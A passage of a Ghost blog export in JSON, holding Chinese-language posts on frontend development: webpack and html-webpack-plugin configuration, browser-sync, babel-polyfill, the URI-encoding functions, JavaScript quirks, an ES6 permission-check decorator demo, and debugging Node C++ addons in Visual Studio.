','));\n})();\n\n\n670120plL","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-29T10:21:40.000Z","created_by":"1","updated_at":"2019-04-06T18:28:32.000Z","updated_by":"1","published_at":"2018-06-04T06:03:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ee","uuid":"4d40928a-e5e5-48a4-b23f-ef0a318d0c3a","title":"工具推荐","slug":"expressri-ji","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"MarkDown工具，Typora，支持markdown转html，pdf，word。\\n\\n正则工具，[Regulex](https://jex.im/regulex/#!embed=false&flags=&re=%5E(a%7Cb)*%3F%24),这是个网站。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>MarkDown工具，Typora，支持markdown转html，pdf，word。</p>\n<p>正则工具，<a href=\"https://jex.im/regulex/#!embed=false&amp;flags=&amp;re=%5E(a%7Cb)*%3F%24\">Regulex</a>,这是个网站。</p>\n<!--kg-card-end: markdown-->","comment_id":"49","plaintext":"MarkDown工具，Typora，支持markdown转html，pdf，word。\n\n正则工具，Regulex [https://jex.im/regulex/#!embed=false&flags=&re=%5E(a%7Cb)*%3F%24]\n,这是个网站。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-04T09:48:25.000Z","created_by":"1","updated_at":"2016-12-21T10:14:49.000Z","updated_by":"1","published_at":"2016-12-21T10:14:49.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ef","uuid":"f960a7cd-fb49-4c0e-a7be-9c273a4c0db1","title":"JS笔记2","slug":"jsde-shi-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nvar a;\\na||1+1 //2\\n1+a||1 //1[object Object]\\\"  //1+(a||1)\\n```\\n\\n```\\n(function() {\\n      var a = b = 5;   //b=5;var a=b;\\n  })();   \\nconsole.log(b);  //b=5  \\nconsole.log(a);  //a undefined\\n```\\n\\n```\\n\\nlet命令下面一行的圆括号是必须的,否则会报错。因为解析器会将起首的大括号,理解成一个代码块,而不是赋值语句\\nlet obj = {};\\nlet arr = [];\\n({foo:obj.prop, bar:arr[0] } = {foo:123, bar:true})\\n////////////////\\nvar {name}= obj;\\n```\\n```\\njs unicode编码\\n一种是\\\"\\\\u6d4b\\\"，还有一种是'\\\\x68'\\n'\\\\\\\\u'+('0000' + '测'.charCodeAt(0).toString(16)).slice(-4)\\n'\\\\\\\\x'+'h'.charCodeAt(0).toString(16)\\n\\n'\\\\x'只能表示（0x20~0x7E）英文数字等特殊符号\\n'\\\\u'是标准的unicode\\n```\\n\\n\\n\\n\\n\\n`npm config set unsafe-perm true`\\n\\n`export NODE_ENV=production`\\n\\n```\\nx-requested-with:XMLHttpRequest  //表明是AJax异步\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>var a;\na||1+1 //2\n1+a||1 //1[object Object]&quot;  //1+(a||1)\n</code></pre>\n<pre><code>(function() {\n      var a = b = 5;   //b=5;var a=b;\n  })();   \nconsole.log(b);  //b=5  \nconsole.log(a);  //a undefined\n</code></pre>\n<pre><code>\nlet命令下面一行的圆括号是必须的,否则会报错。因为解析器会将起首的大括号,理解成一个代码块,而不是赋值语句\nlet obj = {};\nlet arr = [];\n({foo:obj.prop, bar:arr[0] } = {foo:123, bar:true})\n////////////////\nvar {name}= obj;\n</code></pre>\n<pre><code>js unicode编码\n一种是&quot;\\u6d4b&quot;，还有一种是'\\x68'\n'\\\\u'+('0000' + '测'.charCodeAt(0).toString(16)).slice(-4)\n'\\\\x'+'h'.charCodeAt(0).toString(16)\n\n'\\x'只能表示（0x20~0x7E）英文数字等特殊符号\n'\\u'是标准的unicode\n</code></pre>\n<p><code>npm config set unsafe-perm true</code></p>\n<p><code>export NODE_ENV=production</code></p>\n<pre><code>x-requested-with:XMLHttpRequest  //表明是AJax异步\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"50","plaintext":"var a;\na||1+1 //2\n1+a||1 //1[object Object]\"  //1+(a||1)\n\n\n(function() {\n      var a = b = 5;   //b=5;var a=b;\n  })();   \nconsole.log(b);  //b=5  \nconsole.log(a);  //a undefined\n\n\n\nlet命令下面一行的圆括号是必须的,否则会报错。因为解析器会将起首的大括号,理解成一个代码块,而不是赋值语句\nlet obj = {};\nlet arr = [];\n({foo:obj.prop, bar:arr[0] } = {foo:123, bar:true})\n////////////////\nvar {name}= obj;\n\n\njs unicode编码\n一种是\"\\u6d4b\"，还有一种是'\\x68'\n'\\\\u'+('0000' + '测'.charCodeAt(0).toString(16)).slice(-4)\n'\\\\x'+'h'.charCodeAt(0).toString(16)\n\n'\\x'只能表示（0x20~0x7E）英文数字等特殊符号\n'\\u'是标准的unicode\n\n\nnpm config set unsafe-perm true\n\nexport NODE_ENV=production\n\nx-requested-with:XMLHttpRequest  //表明是AJax异步","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-04T10:59:47.000Z","created_by":"1","updated_at":"2017-02-21T07:35:38.000Z","updated_by":"1","published_at":"2016-07-24T16:17:27.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f0","uuid":"ec0f3675-07b8-4b3e-9a73-396b398ccdb9","title":"html-webpack-plugin使用","slug":"html-webpack-pluginshiyong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"一般，升级网站，要改js名字，加个版本号等。现在，有html-webpack-plugin，自动生成html。真正的前端自动化。\\n```\\nvar path = require('path');  \\nvar webpack = require('webpack');  \\nvar HtmlWebpackPlugin = require('html-webpack-plugin');\\n\\nmodule.exports = {  \\n    entry: {\\n        page1: \\\"./js/page1.js\\\",   //人口文件\\n        page2:\\\"./js/page2.js\\\"\\n    },\\n    output: {\\n        path: __dirname + '/build',\\n        filename: \\\"[hash:8].[name].bundle.js\\\",\\n        publicPath: \\\"/static/build/\\\",\\n        chunkFilename:'[hash:8].[name].chunkbundle.js'\\n    },\\n    plugins: [\\n        new webpack.optimize.CommonsChunkPlugin({\\n            name: \\\"commons\\\",\\n            filename: \\\"[hash:8].commons.js\\\",\\n            chunks: ['page1', 'page2']\\n        }),  //提取公共模块\\n        new HtmlWebpackPlugin({\\n            title:'平台',  //html的title\\n            inject:'body', //在body标签插入\\n            filename:'main.html',\\n            template:'htmlTemplate/template.html',  //模板\\n            chunks:['page1','commons'],  //页面需要的模块\\n            minify: { //压缩HTML文件\\n                removeComments: true, //移除HTML中的注释\\n                collapseWhitespace: false //删除空白符与换行符\\n            }\\n        }),\\n        new HtmlWebpackPlugin({\\n            title:'平台',\\n            inject:'body', //在body标签插入\\n            filename:'index.html',\\n            template:'htmlTemplate/template.html',\\n            chunks:['page2','commons'],\\n            minify: { //压缩HTML文件\\n                removeComments: true, //移除HTML中的注释\\n                collapseWhitespace: false //删除空白符与换行符\\n            }\\n        }),\\n    ]\\n};\\n```\\n提取公共模块:\\n```  \\nnew webpack.optimize.CommonsChunkPlugin(\\\"[hash:8].commons.js\\\", [\\\"page1\\\", \\\"page2\\\"]),  //提取公共模块  \\n//这样虽然可以提取，但是html-webpack-plugin不能用，要用下面的写法，把name属性注明\\n        new webpack.optimize.CommonsChunkPlugin({\\n            name: \\\"commons\\\",\\n            filename: \\\"[hash:8].commons.js\\\",\\n            chunks: ['page1', 'page2']\\n        }),  \\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>一般，升级网站，要改js名字，加个版本号等。现在，有html-webpack-plugin，自动生成html。真正的前端自动化。</p>\n<pre><code>var path = require('path');  \nvar webpack = require('webpack');  \nvar HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {  \n    entry: {\n        page1: &quot;./js/page1.js&quot;,   //人口文件\n        page2:&quot;./js/page2.js&quot;\n    },\n    output: {\n        path: __dirname + '/build',\n        filename: &quot;[hash:8].[name].bundle.js&quot;,\n        publicPath: &quot;/static/build/&quot;,\n        chunkFilename:'[hash:8].[name].chunkbundle.js'\n    },\n    plugins: [\n        new webpack.optimize.CommonsChunkPlugin({\n            name: &quot;commons&quot;,\n            filename: &quot;[hash:8].commons.js&quot;,\n            chunks: ['page1', 'page2']\n        }),  //提取公共模块\n        new HtmlWebpackPlugin({\n            title:'平台',  //html的title\n            inject:'body', //在body标签插入\n            filename:'main.html',\n            template:'htmlTemplate/template.html',  //模板\n            chunks:['page1','commons'],  //页面需要的模块\n            minify: { //压缩HTML文件\n                removeComments: true, //移除HTML中的注释\n                collapseWhitespace: false //删除空白符与换行符\n            }\n        }),\n        new HtmlWebpackPlugin({\n            title:'平台',\n            inject:'body', //在body标签插入\n            filename:'index.html',\n            template:'htmlTemplate/template.html',\n            chunks:['page2','commons'],\n            minify: { //压缩HTML文件\n                removeComments: true, //移除HTML中的注释\n                collapseWhitespace: false //删除空白符与换行符\n            }\n        }),\n    ]\n};\n</code></pre>\n<p>提取公共模块:</p>\n<pre><code>new webpack.optimize.CommonsChunkPlugin(&quot;[hash:8].commons.js&quot;, [&quot;page1&quot;, &quot;page2&quot;]),  //提取公共模块  \n//这样虽然可以提取，但是html-webpack-plugin不能用，要用下面的写法，把name属性注明\n        new webpack.optimize.CommonsChunkPlugin({\n            name: &quot;commons&quot;,\n            filename: &quot;[hash:8].commons.js&quot;,\n            chunks: ['page1', 'page2']\n        }),  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"51","plaintext":"一般，升级网站，要改js名字，加个版本号等。现在，有html-webpack-plugin，自动生成html。真正的前端自动化。\n\nvar path = require('path');  \nvar webpack = require('webpack');  \nvar HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {  \n    entry: {\n        page1: \"./js/page1.js\",   //人口文件\n        page2:\"./js/page2.js\"\n    },\n    output: {\n        path: __dirname + '/build',\n        filename: \"[hash:8].[name].bundle.js\",\n        publicPath: \"/static/build/\",\n        chunkFilename:'[hash:8].[name].chunkbundle.js'\n    },\n    plugins: [\n        new webpack.optimize.CommonsChunkPlugin({\n            name: \"commons\",\n            filename: \"[hash:8].commons.js\",\n            chunks: ['page1', 'page2']\n        }),  //提取公共模块\n        new HtmlWebpackPlugin({\n            title:'平台',  //html的title\n            inject:'body', //在body标签插入\n            filename:'main.html',\n            template:'htmlTemplate/template.html',  //模板\n            chunks:['page1','commons'],  //页面需要的模块\n            minify: { //压缩HTML文件\n                removeComments: true, //移除HTML中的注释\n                collapseWhitespace: false //删除空白符与换行符\n            }\n        }),\n        new HtmlWebpackPlugin({\n            title:'平台',\n            inject:'body', //在body标签插入\n            filename:'index.html',\n            template:'htmlTemplate/template.html',\n            chunks:['page2','commons'],\n            minify: { //压缩HTML文件\n                removeComments: true, //移除HTML中的注释\n                collapseWhitespace: false //删除空白符与换行符\n            }\n        }),\n    ]\n};\n\n\n提取公共模块:\n\nnew webpack.optimize.CommonsChunkPlugin(\"[hash:8].commons.js\", [\"page1\", \"page2\"]),  //提取公共模块  \n//这样虽然可以提取，但是html-webpack-plugin不能用，要用下面的写法，把name属性注明\n        new webpack.optimize.CommonsChunkPlugin({\n            name: \"commons\",\n            filename: \"[hash:8].commons.js\",\n            chunks: ['page1', 'page2']\n        }),","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-13T10:15:45.000Z","created_by":"1","updated_at":"2017-01-17T06:31:04.000Z","updated_by":"1","published_at":"2016-07-13T10:30:59.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f1","uuid":"32a61ad3-f6ac-46e7-a6ae-4757a7631e2a","title":"escape;encodeURI;encodeURIComponent","slug":"escape-encodeuri-encodeuricomponent","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* escape\\n* unescape\\n* encodeURI\\n* decodeURI\\n* encodeURIComponent\\n* decodeURIComponent\\n\\nencodeURI方法不会对下列字符编码`ASCII?????? ?????? ~!@#$&*()=:/,;?+'`\\nencodeURIComponent方法不会对下列字符编码`ASCII?????? ?????? ~!*()'`\\n\\n首先，escape unescape 已经被w3c废弃，是非标准的，应当避免使用。 encodeURI和encodeURIComponent的区别在于转义的范围不一样。\\n\\nencodeURI一般用在 URL 上。因为一般url是`https://www.baidu.com`这种。encodeURI不会对`: //`字符转义\\n\\nencodeURIComponent用在URL的参数上（get/post）。参数一般形式`a=xxx&b=xxx`,这时`& =`两个特殊符号很重要，如果`xxx`中有`&`就会导致参数中断，发的数据不全。这时要用encodeURIComponent转义，把`xxx`中的`& =`转掉。\\n\\n\\ndecodeURI；decodeURIComponent反之。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>escape</li>\n<li>unescape</li>\n<li>encodeURI</li>\n<li>decodeURI</li>\n<li>encodeURIComponent</li>\n<li>decodeURIComponent</li>\n</ul>\n<p>encodeURI方法不会对下列字符编码<code>ASCII?????? ?????? ~!@#$&amp;*()=:/,;?+'</code><br>\nencodeURIComponent方法不会对下列字符编码<code>ASCII?????? ?????? ~!*()'</code></p>\n<p>首先，escape unescape 已经被w3c废弃，是非标准的，应当避免使用。 encodeURI和encodeURIComponent的区别在于转义的范围不一样。</p>\n<p>encodeURI一般用在 URL 上。因为一般url是<code>https://www.baidu.com</code>这种。encodeURI不会对<code>: //</code>字符转义</p>\n<p>encodeURIComponent用在URL的参数上（get/post）。参数一般形式<code>a=xxx&amp;b=xxx</code>,这时<code>&amp; =</code>两个特殊符号很重要，如果<code>xxx</code>中有<code>&amp;</code>就会导致参数中断，发的数据不全。这时要用encodeURIComponent转义，把<code>xxx</code>中的<code>&amp; =</code>转掉。</p>\n<p>decodeURI；decodeURIComponent反之。</p>\n<!--kg-card-end: markdown-->","comment_id":"52","plaintext":" * escape\n * unescape\n * encodeURI\n * decodeURI\n * encodeURIComponent\n * decodeURIComponent\n\nencodeURI方法不会对下列字符编码ASCII?????? ?????? ~!@#$&*()=:/,;?+'\nencodeURIComponent方法不会对下列字符编码ASCII?????? ?????? ~!*()'\n\n首先，escape unescape 已经被w3c废弃，是非标准的，应当避免使用。\nencodeURI和encodeURIComponent的区别在于转义的范围不一样。\n\nencodeURI一般用在 URL 上。因为一般url是https://www.baidu.com这种。encodeURI不会对: //字符转义\n\nencodeURIComponent用在URL的参数上（get/post）。参数一般形式a=xxx&b=xxx,这时& =两个特殊符号很重要，如果xxx中有&\n就会导致参数中断，发的数据不全。这时要用encodeURIComponent转义，把xxx中的& =转掉。\n\ndecodeURI；decodeURIComponent反之。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-14T08:54:51.000Z","created_by":"1","updated_at":"2017-01-17T06:30:22.000Z","updated_by":"1","published_at":"2016-07-14T09:17:32.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f2","uuid":"34af4f23-cd2c-40c7-aa12-b6c2407b16a5","title":"es6 装饰器-权限管理","slug":"es6-zhuang-shi-qi-quan-xian-guan-li","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nvar reduxStore={roles:['read']}  //redux-store存储用户的权限列表\\n\\nfunction log(target, name, descriptor) {  \\n  var oldValue = descriptor.value;\\n  descriptor.value = function() {\\n    console.log(`\\\"Call ${name}\\\" arguments`, arguments);\\n    return oldValue.apply(null, arguments);\\n  };\\n  return descriptor;\\n}\\n\\nfunction checkRole(role){  //检查权限  \\n    return (target, property, descriptor)=>{\\n        if(reduxStore.roles.indexOf(role)==-1){\\n            descriptor.value=function(){\\n                console.log('没有权限')\\n            };  //如果没有权限，改变方法。\\n        }\\n        return descriptor\\n    }\\n}\\nclass Components{}\\n\\nclass AComponents extends Components{  \\n  constructor(){\\n    super()\\n  }\\n  @log\\n  log(arg){\\n    console.log('我执行有log记录的')\\n  }\\n\\n  @checkRole('read')  //需要read权限才执行read()\\n  read(){\\n   console.log('read')\\n  }\\n\\n  @checkRole('write')  //需要write权限才执行read()\\n  write(){\\n   console.log('write')\\n  }\\n  render(){}\\n}\\nvar a = new AComponents();  \\na.read();  \\na.write();  \\na.log('arg')  \\n```\\n上面的是一个模拟react的组件。并加入权限控制。在[babel](http://babeljs.cn/repl/)测试通过\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>var reduxStore={roles:['read']}  //redux-store存储用户的权限列表\n\nfunction log(target, name, descriptor) {  \n  var oldValue = descriptor.value;\n  descriptor.value = function() {\n    console.log(`&quot;Call ${name}&quot; arguments`, arguments);\n    return oldValue.apply(null, arguments);\n  };\n  return descriptor;\n}\n\nfunction checkRole(role){  //检查权限  \n    return (target, property, descriptor)=&gt;{\n        if(reduxStore.roles.indexOf(role)==-1){\n            descriptor.value=function(){\n                console.log('没有权限')\n            };  //如果没有权限，改变方法。\n        }\n        return descriptor\n    }\n}\nclass Components{}\n\nclass AComponents extends Components{  \n  constructor(){\n    super()\n  }\n  @log\n  log(arg){\n    console.log('我执行有log记录的')\n  }\n\n  @checkRole('read')  //需要read权限才执行read()\n  read(){\n   console.log('read')\n  }\n\n  @checkRole('write')  //需要write权限才执行read()\n  write(){\n   console.log('write')\n  }\n  render(){}\n}\nvar a = new AComponents();  \na.read();  \na.write();  \na.log('arg')  \n</code></pre>\n<p>上面的是一个模拟react的组件。并加入权限控制。在<a href=\"http://babeljs.cn/repl/\">babel</a>测试通过</p>\n<!--kg-card-end: markdown-->","comment_id":"53","plaintext":"var reduxStore={roles:['read']}  //redux-store存储用户的权限列表\n\nfunction log(target, name, descriptor) {  \n  var oldValue = descriptor.value;\n  descriptor.value = function() {\n    console.log(`\"Call ${name}\" arguments`, arguments);\n    return oldValue.apply(null, arguments);\n  };\n  return descriptor;\n}\n\nfunction checkRole(role){  //检查权限  \n    return (target, property, descriptor)=>{\n        if(reduxStore.roles.indexOf(role)==-1){\n            descriptor.value=function(){\n                console.log('没有权限')\n            };  //如果没有权限，改变方法。\n        }\n        return descriptor\n    }\n}\nclass Components{}\n\nclass AComponents extends Components{  \n  constructor(){\n    super()\n  }\n  @log\n  log(arg){\n    console.log('我执行有log记录的')\n  }\n\n  @checkRole('read')  //需要read权限才执行read()\n  read(){\n   console.log('read')\n  }\n\n  @checkRole('write')  //需要write权限才执行read()\n  write(){\n   console.log('write')\n  }\n  render(){}\n}\nvar a = new AComponents();  \na.read();  \na.write();  \na.log('arg')  \n\n\n上面的是一个模拟react的组件。并加入权限控制。在babel [http://babeljs.cn/repl/]测试通过","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-20T10:00:21.000Z","created_by":"1","updated_at":"2017-01-17T06:28:03.000Z","updated_by":"1","published_at":"2016-07-20T10:08:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f3","uuid":"20753578-de4b-463f-a040-0613ec7724e2","title":"webpack+browser-sync","slug":"webpack-browser-sync","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\">browser-sync介绍\\n\\n    Browsersync能让浏览器实时、快速响应您的文件更改（html、js、css、sass、less等）并自动刷新页面。更重要的是 Browsersync可以同时在PC、平板、手机等设备下进项调试。您可以想象一下：“假设您的桌子上有pc、ipad、iphone、android等设备，同时打开了您需要调试的页面，当您使用browsersync后，您的任何一次代码保存，以上的设备都会同时显示您的改动”。\\n\\n    有了它，您不用在多个浏览器、多个设备间来回切换，频繁的刷新页面。更神奇的是您在一个浏览器中滚动页面、点击等行为也会同步到其他浏览器和设备中，这一切还可以通过可视化界面来控制。\\n\\n>配合webpack使用。\\n\\n* npm install --save-dev browser-sync\\n* npm install --save-dev browser-sync-webpack-plugin\\n\\n```\\nvar BrowserSyncPlugin = require('browser-sync-webpack-plugin');\\nplugins: [\\nnew BrowserSyncPlugin({\\n       // browse to http://localhost:3000/ during development\\n        host: 'localhost',\\n        port: 3000, //代理后访问的端口\\n        proxy: 'localhost:80',//要代理的端口\\n    },\\n      // plugin options\\n      {\\n        // prevent BrowserSync from reloading the page\\n        // and let Webpack Dev Server take care of this\\n        reload: true\\n      })\\n]\\n```\\n* webpack --watch\\n成功后，访问localhost:3000\\n这是页面右上角显示\\n![](/content/images/2016/08/LHY-X3W-3-WY30O5P3GC--5.png)\\n访问localhost:3001\\n显示browser-sync后台,这里有很多选项。\\n![](/content/images/2016/08/TG0GBZ-Y-E-QP_DO51WG-PF.png)\\n\\n>browser-sync 最嗨的是可以同步浏览器操作。\\n![](/content/images/2016/08/scroll-demo.gif)\\n![](/content/images/2016/08/2668106730-550a6d7e47f8c_articlex.gif)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>browser-sync介绍</p>\n</blockquote>\n<pre><code>Browsersync能让浏览器实时、快速响应您的文件更改（html、js、css、sass、less等）并自动刷新页面。更重要的是 Browsersync可以同时在PC、平板、手机等设备下进项调试。您可以想象一下：“假设您的桌子上有pc、ipad、iphone、android等设备，同时打开了您需要调试的页面，当您使用browsersync后，您的任何一次代码保存，以上的设备都会同时显示您的改动”。\n\n有了它，您不用在多个浏览器、多个设备间来回切换，频繁的刷新页面。更神奇的是您在一个浏览器中滚动页面、点击等行为也会同步到其他浏览器和设备中，这一切还可以通过可视化界面来控制。\n</code></pre>\n<blockquote>\n<p>配合webpack使用。</p>\n</blockquote>\n<ul>\n<li>npm install --save-dev browser-sync</li>\n<li>npm install --save-dev browser-sync-webpack-plugin</li>\n</ul>\n<pre><code>var BrowserSyncPlugin = require('browser-sync-webpack-plugin');\nplugins: [\nnew BrowserSyncPlugin({\n       // browse to http://localhost:3000/ during development\n        host: 'localhost',\n        port: 3000, //代理后访问的端口\n        proxy: 'localhost:80',//要代理的端口\n    },\n      // plugin options\n      {\n        // prevent BrowserSync from reloading the page\n        // and let Webpack Dev Server take care of this\n        reload: true\n      })\n]\n</code></pre>\n<ul>\n<li>webpack --watch<br>\n成功后，访问localhost:3000<br>\n这是页面右上角显示<br>\n<img src=\"/content/images/2016/08/LHY-X3W-3-WY30O5P3GC--5.png\" alt=\"\"><br>\n访问localhost:3001<br>\n显示browser-sync后台,这里有很多选项。<br>\n<img src=\"/content/images/2016/08/TG0GBZ-Y-E-QP_DO51WG-PF.png\" alt=\"\"></li>\n</ul>\n<blockquote>\n<p>browser-sync 最嗨的是可以同步浏览器操作。<br>\n<img src=\"/content/images/2016/08/scroll-demo.gif\" alt=\"\"><br>\n<img src=\"/content/images/2016/08/2668106730-550a6d7e47f8c_articlex.gif\" alt=\"\"></p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"54","plaintext":"> browser-sync介绍\n\n\nBrowsersync能让浏览器实时、快速响应您的文件更改（html、js、css、sass、less等）并自动刷新页面。更重要的是 Browsersync可以同时在PC、平板、手机等设备下进项调试。您可以想象一下：“假设您的桌子上有pc、ipad、iphone、android等设备，同时打开了您需要调试的页面，当您使用browsersync后，您的任何一次代码保存，以上的设备都会同时显示您的改动”。\n\n有了它，您不用在多个浏览器、多个设备间来回切换，频繁的刷新页面。更神奇的是您在一个浏览器中滚动页面、点击等行为也会同步到其他浏览器和设备中，这一切还可以通过可视化界面来控制。\n\n\n> 配合webpack使用。\n\n\n * npm install --save-dev browser-sync\n * npm install --save-dev browser-sync-webpack-plugin\n\nvar BrowserSyncPlugin = require('browser-sync-webpack-plugin');\nplugins: [\nnew BrowserSyncPlugin({\n       // browse to http://localhost:3000/ during development\n        host: 'localhost',\n        port: 3000, //代理后访问的端口\n        proxy: 'localhost:80',//要代理的端口\n    },\n      // plugin options\n      {\n        // prevent BrowserSync from reloading the page\n        // and let Webpack Dev Server take care of this\n        reload: true\n      })\n]\n\n\n * webpack --watch\n   成功后，访问localhost:3000\n   这是页面右上角显示\n   \n   访问localhost:3001\n   显示browser-sync后台,这里有很多选项。\n   \n\n> browser-sync 最嗨的是可以同步浏览器操作。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-17T09:27:41.000Z","created_by":"1","updated_at":"2016-08-17T16:16:54.000Z","updated_by":"1","published_at":"2016-08-17T09:47:59.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f4","uuid":"173e1be4-45f6-4981-93f5-ff5ff6d94b1d","title":"babel-polyfill使用","slug":"babel-polyfillshi-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Babel默认只转换新的JavaScript语法，而不转换新的API，比如Iterator、Generator、Set、Map、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的es5,es6的新方法（比如Object.assign,Array.from）都不会转码。这时就要安装babel-polyfill。\\n\\n> install\\nnpm install --save babel-polyfill\\n\\n2 entry\\n```\\nentry:['babel-polyfill','app.js']//单入口\\n\\nentry:{\\n   page1: ['babel-polyfill', \\\"./js/page1.js\\\"],   //多人口文件\\n   page2: ['babel-polyfill',\\\"./js/page2.js\\\"]\\n},\\n```\\n3 在需要用新api的前面require(\\\"babel-polyfill\\\");\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Babel默认只转换新的JavaScript语法，而不转换新的API，比如Iterator、Generator、Set、Map、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的es5,es6的新方法（比如Object.assign,Array.from）都不会转码。这时就要安装babel-polyfill。</p>\n<blockquote>\n<p>install<br>\nnpm install --save babel-polyfill</p>\n</blockquote>\n<p>2 entry</p>\n<pre><code>entry:['babel-polyfill','app.js']//单入口\n\nentry:{\n   page1: ['babel-polyfill', &quot;./js/page1.js&quot;],   //多人口文件\n   page2: ['babel-polyfill',&quot;./js/page2.js&quot;]\n},\n</code></pre>\n<p>3 在需要用新api的前面require(&quot;babel-polyfill&quot;);</p>\n<!--kg-card-end: markdown-->","comment_id":"55","plaintext":"Babel默认只转换新的JavaScript语法，而不转换新的API，比如Iterator、Generator、Set、Map、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的es5,es6的新方法（比如Object.assign,Array.from）都不会转码。这时就要安装babel-polyfill。\n\n> install\nnpm install --save babel-polyfill\n\n\n2 entry\n\nentry:['babel-polyfill','app.js']//单入口\n\nentry:{\n   page1: ['babel-polyfill', \"./js/page1.js\"],   //多人口文件\n   page2: ['babel-polyfill',\"./js/page2.js\"]\n},\n\n\n3 在需要用新api的前面require(\"babel-polyfill\");","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-26T07:28:35.000Z","created_by":"1","updated_at":"2016-08-26T07:36:19.000Z","updated_by":"1","published_at":"2016-08-26T07:36:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f5","uuid":"0ae39a9d-3dd7-41db-9718-09f5da4a38fc","title":"Node的C/C++ Addons在VS下调试","slug":"nodede-c-c-addonszai-vsxia-diao-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 下载\\n\\n\\n去GitHubs下载源码[nodejs](https://github.com/nodejs/node)，这是最新的node源码。其他的版本到[https://nodejs.org](https://nodejs.org)下载。\\n\\n\\n> 配置\\n\\n* 在源码根目录(我放在D:\\\\node-master)，打开命令行。输入`vcbuild.bat nosign Debug x64`，成功后会生成一些文件和文件夹。\\n* 在工作目录打开控制台。输入node-gyp clean configure --nodedir=\\\"D:\\\\node-master\\\"(nodejs源码根目录)\\n* 这时工作目录出现一个build文件夹，下面有个bind.sln。双击vs就打开了这个解决方案。\\n在打开项目的属性，如下图配置，确定。\\n![](/content/images/2016/08/KY-XVA--JG3KBY-OH40BC-4.png)\\n* 点击调试,出现node的命令行。这里调用方法，vs中打断点就能断点调试了。\\n![](/content/images/2016/08/PFXE9F-7KSN-W-U-L6HE2-Q.png)\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>下载</p>\n</blockquote>\n<p>去GitHubs下载源码<a 